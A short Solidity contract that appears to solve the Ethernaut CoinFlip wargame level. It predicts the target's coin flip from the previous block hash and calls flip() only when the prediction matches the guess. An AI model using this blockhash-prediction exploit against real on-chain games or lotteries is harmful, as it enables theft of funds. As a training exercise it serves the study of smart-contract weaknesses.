// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface coinFlip {
    function flip(bool _guess) external returns (bool);
}

contract EthernautSol3 {
  
  coinFlip constant internal instance  = coinFlip(0x21b7EcD682AB097fB9086cE0A5f447ADA625F729);    
  uint256 public lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 public input;

  function Guessflip(bool _guess) public  returns(uint256) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    input = blockValue/(FACTOR);
    bool side = input == 1 ? true : false;

    if (side == _guess) {
      coinFlip(instance).flip(_guess);
      return input;
    } else {
      return input;
    }
  }
}
